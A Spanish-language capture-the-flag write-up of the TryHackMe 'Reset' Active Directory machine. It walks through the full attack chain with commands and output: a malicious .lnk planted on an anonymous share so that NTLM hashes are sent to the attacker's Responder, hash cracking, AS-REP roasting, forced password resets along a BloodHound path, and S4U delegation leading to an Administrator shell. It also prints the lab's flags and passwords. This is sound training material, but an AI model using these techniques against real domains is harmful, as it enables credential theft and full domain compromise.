# Restablecer

Máquina de nivel avanzado de TryHackMe centrada en **Active Directory / Windows** (dominio `thm.corp`, controlador `HayStack`). En la primera sesión el equipo respondía en `10.65.138.18`; tras restablecer la máquina apareció con la IP `10.65.170.42`. Nuestro equipo atacante es `10.65.82.141`. La ruta completa termina con la flag de root `THM{RE_SET_AND_DELEGATE}`.

## 1. Reconocimiento

Escaneo inicial de puertos:

```bash
nmap 10.65.138.18
```

![[Pasted image 20261123120204.png]]

Puertos abiertos:

- **53/tcp** → domain (DNS).
- **88/tcp** → kerberos-sec (Kerberos).
- **135/tcp** → msrpc.
- **139/tcp** → netbios-ssn.
- **389/tcp** → ldap.
- **445/tcp** → microsoft-ds (SMB).
- **464/tcp** → kpasswd5.
- **593/tcp** → http-rpc-epmap.
- **636/tcp** → ldapssl (LDAP sobre SSL).
- **3268/tcp** → globalcatLDAP (Global Catalog).
- **3269/tcp** → globalcatLDAPssl.
- **3389/tcp** → ms-wbt-server (RDP).

El conjunto de puertos (DNS, Kerberos, LDAP, Global Catalog, SMB y RDP) delata que estamos ante un **controlador de dominio de Windows**.

## 2. Enumeración de servicios y versión

Escaneo con detección de versiones y scripts por defecto:

```bash
nmap -sV -sC 10.65.138.18
```

![[Pasted image 20261123121101.png]]

![[Pasted image 20261123121127.png]]

Datos relevantes:

- **53/tcp** → Simple DNS Plus.
- **88/tcp** → Microsoft Windows Kerberos (server time: 2026-11-23T17:01:25Z).
- **389/tcp y 3268/tcp** → Microsoft Windows Active Directory LDAP, dominio `thm.corp.`, sitio `Default-First-Site-Name`.
- **593/tcp** → Microsoft Windows RPC over HTTP 1.0.
- **3389/tcp** → Microsoft Terminal Services, certificado con `commonName=HayStack.thm.corp` (válido del 2026-11-22 al 2027-05-24).
- `rdp-ntlm-info` revela:
  - `Target_Name`: THM
  - `NetBIOS_Domain_Name`: THM
  - `NetBIOS_Computer_Name`: HAYSTACK
  - `DNS_Domain_Name`: thm.corp
  - `DNS_Computer_Name`: HayStack.thm.corp
  - `DNS_Tree_Name`: thm.corp
  - `Product_Version`: 10.0.17763 (Windows Server 2019)
  - `System_Time`: 2026-11-23T17:01:26+00:00
- Service Info: Host: HAYSTACK; OS: Windows; CPE: `cpe:/o:microsoft:windows`.

## 3. Enumeración SMB

Añadimos el nombre del dominio a `/etc/hosts` y listamos los recursos compartidos de forma anónima:

```bash
nano /etc/hosts
smbclient -L //10.65.138.18 -N
```

![[Pasted image 20261123121439.png]]

![[Pasted image 20261123121455.png]]

Recursos compartidos:

| Share    | Tipo | Comentario           |
| -------- | ---- | -------------------- |
| ADMIN$   | Disk | Remote Admin         |
| C$       | Disk | Default share        |
| Data     | Disk |                      |
| IPC$     | IPC  | Remote IPC           |
| NETLOGON | Disk | Logon server share   |
| SYSVOL   | Disk | Logon server share   |

El servidor tiene SMB1 desactivado y no muestra grupos de trabajo.

## 4. Archivos de onboarding

Entramos al recurso `Data` sin credenciales y exploramos la carpeta `onboarding`, donde hay documentos PDF y un archivo de texto:

```bash
smbclient //10.65.138.18/Data -N
smb: \> ls
smb: \> cd onboarding\
smb: \onboarding\> ls
smb: \onboarding\> get onhdjn4i.vmd.pdf
```

![[Pasted image 20261123121621.png]]

![[Pasted image 20261123122138.png]]

Contenido de `onboarding`:

- `rtd1ahgw.ooo.txt` (521 bytes).
- `wpyo5ehb.rgg.pdf` (3.032.659 bytes).
- `xek1gwvl.5xc.pdf` (4.700.896 bytes).

> **Evidencia:** el acceso anónimo a `Data\onboarding` es el punto de entrada que permitirá colocar el señuelo del paso 6.

## 5. Contraseña inicial

El archivo de texto filtrado dice:

```bash
cat dyasxsu5.h0t.txt
```

> Subject: Welcome to Reset -Dear &lt;USER&gt;,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone. **The initial password is: ResetMe123!** We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role. Best regards, The Reset Team

![[Pasted image 20261123122059.png]]

## 6. Robo de credenciales NTLM con un archivo .lnk

Tras restablecer la máquina (ahora `10.65.170.42`), generamos un acceso directo malicioso con `ntlm_theft` apuntando a nuestra IP de atacante (`10.65.82.141`):

```bash
python3 ntlm_theft.py -g lnk -s 10.65.82.141 -f pwd
```

![[Pasted image 20261123160227.png]]

![[Pasted image 20261123160232.png]]

Y lo subimos al recurso compartido `Data\onboarding`, en el mismo sitio donde están los documentos de onboarding:

```bash
smbclient //10.65.170.42/Data -N
smb: \> cd onboarding\
smb: \onboarding\> put pwd.lnk
```

![[Pasted image 20261123160316.png]]

El archivo `pwd.lnk` (2164 bytes) queda junto al resto de documentos, esperando a que alguien lo abra.

## 7. Captura del hash NTLMv2 con Responder

Levantamos Responder en la interfaz de nuestro equipo:

```bash
responder -I ens5
```

![[Pasted image 20261123160359.png]]

![[Pasted image 20261123160426.png]]

![[Pasted image 20261123160448.png]]

Dejamos que Responder envenene LLMNR/NBT-NS/MDNS y escuche los eventos SMB. Aparece la conexión:

```text
[SMB] NTLMv2-SSP Client   : 10.65.170.42
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : THM\AUTOMATE::THM:b031b6898670ee33:6f4bdd558bb16ac48b3f2b0b27c76d78:0101000…
```

![[Pasted image 20261123160514.png]]

Las siguientes peticiones se omiten por estar ya capturada la misma cuenta (`Skipping previously captured hash for THM\AUTOMATE`).

## 8. Crackeo del hash con hashcat

Guardamos el hash en `hash.txt` y lo atacamos con el modo **5600 (NetNTLMv2)** y el diccionario rockyou:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20261123162551.png]]

El hash se rompe al instante (1/1 digests, 0 segundos):

```text
AUTOMATE::THM:b031b6898670ee33:…:Passw0rd1
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Estimated...: Mon Nov 23 21:26:10 2026 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
```

![[Pasted image 20261123162633.png]]

**Credenciales obtenidas:** `AUTOMATE:Passw0rd1`

## 9. Acceso WinRM y bandera de usuario

Con las credenciales entramos por WinRM y leemos la flag del usuario desde el escritorio:

```bash
cat credenciales.txt
evil-winrm -u AUTOMATE -p Passw0rd1 -i 10.65.170.42
```

![[Pasted image 20261123163117.png]]

```powershell
PS C:\Users\automate\Desktop> type "C:\Users\automate\Desktop\user.txt"
THM{AUTOMATION_WILL_REPLACE_US}
```

![[Pasted image 20261123163337.png]]

**Bandera de usuario:** `THM{AUTOMATION_WILL_REPLACE_US}`

## 10. Enumeración de usuarios del dominio

Con la cuenta de bajo privilegio consultamos los SIDs del dominio para obtener el listado de usuarios y grupos:

```bash
impacket-lookupsid 'thm.corp/AUTOMATE:Passw0rd1'@10.64.134.198
```

![[Pasted image 20261123231557.png]]

La salida revela los grupos privilegiados (`Domain Admins`, `Enterprise Admins`, `Protected Users`, `Key Admins`, los grupos de replicación RODC…) y más de un centenar de cuentas de usuario, entre ellas `TABATHA_BRITT`, `SHAWNA_BRAY`, `CRUZ_HALL`, `DARLA_WINTERS`, `MELANIE_MONTGOMERY` y `MALLORY_LEWIS`. Ese listado se guarda en `usuario.txt` para usarlo como diccionario de usuarios.

## 11. AS-REP Roasting

Pedimos tickets AS-REP para esos usuarios contra el controlador de dominio:

```bash
impacket-GetNPUsers thm.corp/ -dc-ip 10.64.134.198 -userfile usuario.txt -no-pass
```

![[Pasted image 20261123232621.png]]

La mayoría responde `doesn't have UF_DONT_REQUIRE_PREAUTH set`, pero varias cuentas sí tienen desactivada la preautenticación Kerberos y devuelven un hash `$krb5asrep$23$…` susceptible de ataque offline. Se guardan tres hashes en `hash0n.txt`: `TABATHA_BRITT`, `STIVA_BENNETT` y `MELANIE_MONTGOMERY`.

## 12. Crackeo de la contraseña de TABATHA_BRITT

Atacamos los hashes AS-REP con John the Ripper y rockyou:

```bash
john hash0n.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Pasted image 20261123233435.png]]

![[Pasted image 20261123233508.png]]

John carga 3 hashes con 3 sales distintas (tipos 17/18/23) y obtiene:

```text
marlboro(1985)    ($krb5asrep$23$TABATHA_BRITT@THM.CORP)
```

**Credenciales obtenidas:** `TABATHA_BRITT:marlboro(1985)`

## 13. Exportación y análisis con BloodHound

Recolectamos los datos del dominio y generamos el archivo para BloodHound:

```bash
bloodhound-python -u TABATHA_BRITT -p 'marlboro(1985)' -d THM.CORP -ns 10.64.134.198 -c All --zip
bloodhound-start
```

![[Pasted image 20261123234101.png]]

El recolector identifica el dominio `thm.corp`, el DC `haystack.thm.corp`, **52 usuarios, 55 grupos, 3 GPOs, 19 contenedores, 222 OUs y 0 trusts**, y comprime la salida en `2026112323804_bloodhound.zip`. `bloodhound-start` inicia Neo4j en `http://localhost:7474`.

En BloodHound Community Edition (`http://127.0.0.1:8080`) trazamos la ruta de `TABATHA_BRITT@THM.CORP` a `DOMAIN ADMINS@THM.CORP`:

![[Pasted image 20261124005550.png]]

![[Pasted image 20261124005514.png]]

La cadena de permisos es:

```text
TABATHA_BRITT →(GenericAll)→ SHAWNA_BRAY →(WriteAccountRestrictions)→ CRUZ_HALL
→(ForceChangePassword)→ DARLA_WINTERS →(AllowedToDelegate)→ HAYSTACK.THM.CORP
→(GenericAll / DCsync)→ THM.CORP (dominio)
   ├─ Contains → TEST@THM.CORP (OU) → HORACE_BOYLE
   ├─ Contains → SERVICEACCOUNTS@THM.CORP (OU)
   ├─ Contains → USERS@THM.CORP (OU) → CECILE_WONG
   └─ Contains → USERS@GTEST.LOCAL (OU) → ADMINISTRATOR@GTEST.LOCAL
                     └─ MemberOf → DOMAIN ADMINS@THM.CORP
```

## 14. Cambio de contraseñas y suplantación de Administrator

Ejecutamos el cambio de contraseñas de la cadena con `net rpc password`, usando en cada paso la credencial recién creada. Después pedimos un ticket con `get(tgt)` e `impacket-getST` para suplantar a `Administrator` mediante S4U2proxy:

```bash
net rpc password "SHAWNA_BRAY" "newP@ssw0rd2022" -U "THM.CORP"/"TABATHA_BRITT"%'marlboro(1985)' -S "THM.CORP"
net rpc password "CRUZ_HALL" "newP@ssw0rd2022" -U "THM.CORP"/"SHAWNA_BRAY"%"newP@ssw0rd2022" -S "THM.CORP"
net rpc password "DARLA_WINTERS" "newP@ssw0rd2022" -U "THM.CORP"/"CRUZ_HALL"%"newP@ssw0rd2022" -S "THM.CORP"
```

![[Pasted image 20261124005449.png]]

Con la última cuenta de la cadena solicitamos el ticket delegado y abrimos una shell sobre el controlador:

```bash
impacket-getST -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS
export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
impacket-wmiexec THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
```

![[Pasted image 20261124010401.png]]

La salida confirma `Getting TGT for user`, `Impersonating Administrator`, `Requesting S4U2Self`, `Requesting S4U2Proxy` y `Saving ticket in Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache`. Tras exportar `KRB5CCNAME`, `wmiexec` lanza una shell semiinteractiva con prompt `C:\>`.

![[Pasted image 20261124010429.png]]

## 15. Bandera de root

Desde la shell como `Administrator` recorremos `C:\Users\Administrator\Desktop`, donde aparece `root.txt`:

```powershell
C:\Users\Administrator\Desktop>type root.txt
THM{RE_SET_AND_DELEGATE}
```

![[Pasted image 20261124010453.png]]

**Bandera de root:** `THM{RE_SET_AND_DELEGATE}`

## Resumen de la cadena de ataque

1. `nmap` identifica un controlador de dominio (`HayStack`, `thm.corp`).
2. `smbclient -L` encuentra el recurso `Data` accesible sin autenticación.
3. Los documentos de `onboarding` filtran la contraseña inicial `ResetMe123!`.
4. `ntlm_theft` genera un `.lnk` que, al abrirse desde el compartido, fuerza autenticación NTLM contra nuestro Responder.
5. Responder captura el NetNTLMv2 del usuario `THM\AUTOMATE`.
6. `hashcat -m 5600` con rockyou obtiene `Passw0rd1`.
7. `evil-winrm` permite leer `user.txt` → `THM{AUTOMATION_WILL_REPLACE_US}`.
8. `impacket-lookupsid` enumera los usuarios del dominio.
9. `GetNPUsers` captura hashes AS-REP de cuentas sin preautenticación.
10. `john` crackea el hash de `TABATHA_BRITT` → `marlboro(1985)`.
11. `bloodhound-python` exporta el dominio y BloodHound traza la ruta hasta `DOMAIN ADMINS`.
12. `net rpc password` ejecuta el cambio de contraseñas y `getST` suplanta a `Administrator` por delegación (S4U2self/S4U2proxy).
13. `wmiexec` abre una shell como Administrador y lee `root.txt` → `THM{RE_SET_AND_DELEGATE}`.

## Indicadores (IoC)

- **IPs:** `10.65.138.18`, `10.65.170.42`, `10.64.134.198`, `10.64.132.112`, `10.65.82.141`.
- **Usuarios:** `AUTOMATE`, `TABATHA_BRITT`, `SHAWNA_BRAY`, `CRUZ_HALL`, `DARLA_WINTERS`, `STIVA_BENNETT`, `MELANIE_MONTGOMERY`.
- **Hashes:** NTLMv2 de `THM\AUTOMATE` (`b031b6898670ee33…`) → `Passw0rd1`; `$krb5asrep$23$TABATHA_BRITT@THM.CORP` → `marlboro(1985)`; NTLM de `Administrator` `2b576acbe6bcfa729d4b6d180418f8`.
- **Archivos:** `pwd.lnk`, `usuario.txt`, `hash0n.txt`, `hash.txt`, `credenciales.txt`, `2026112323804_bloodhound.zip`, `user.txt`, `root.txt`.
- **Flags:** usuario `THM{AUTOMATION_WILL_REPLACE_US}` · root `THM{RE_SET_AND_DELEGATE}`.
